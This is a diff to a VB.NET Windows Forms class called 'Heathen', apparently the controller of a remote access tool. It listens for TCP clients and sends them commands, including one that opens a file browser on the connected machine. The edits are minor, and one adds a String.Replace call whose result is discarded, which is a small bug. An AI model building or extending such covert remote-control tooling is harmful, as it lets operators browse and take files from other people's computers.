@@ -275,6 +275,7 @@ Public Class Heathen
         FMM.Show()
 
         RichTextBox1.Text = String.Empty
+        IO.File.Delete("Vol.txt")
     End Sub
     Public Sub CheckKillTask(ByVal h As String)
         If RichTextBox1.Text.Contains("Amazing") Then
@@ -327,6 +328,9 @@ Public Class Heathen
         End If
 
         FMM.Label3.Text = PathForFM
+
+        FMM.Label3.Text.Replace("//", "/")
+
         Dim imageList = New ImageList()
         FMM.ListView1.SmallImageList = imageList
         For Each yu In files
@@ -501,6 +505,7 @@ Public Class Heathen
     Private Sub BunifuButton2_Click(sender As Object, e As EventArgs) Handles BunifuButton2.Click
         Try 'Au cas d'erreur
             If (BunifuButton2.Text = "Listen") Then
+
                 MonServeur = New TcpListener(IPAddress.Any, Integer.Parse(TextPort.Text))
                 LesClients = New List(Of TcpClient)
                 MonServeur.Start()
@@ -606,6 +611,8 @@ Public Class Heathen
 
                 Next
             Case RichTextBox3.Text = "FM"
+
+
                 FMM.Text = ComboBox1.Text
                 Dim buffer() As Byte = Encoding.UTF8.GetBytes("IWouldLikeToseeYourFile")
                 For Each client As TcpClient In LesClients
@@ -1123,6 +1130,10 @@ Public Class Heathen
             Next
 
         End If
+    End Sub
+
+    Private Sub RichTextBox3_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox3.TextChanged
+
     End Sub
 
 
